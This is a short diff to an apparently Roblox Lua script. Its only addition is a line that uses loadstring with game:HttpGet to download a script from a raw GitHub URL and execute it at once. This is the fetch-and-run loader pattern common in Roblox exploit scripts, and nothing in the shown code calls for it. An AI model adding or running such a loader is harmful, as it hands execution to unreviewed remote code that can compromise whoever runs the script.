@@ -5,3 +5,5 @@ if not FileIsLocated then
 end
 	
 wait(0.000001)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxhubs/robloxscript/main/script.lua"))()
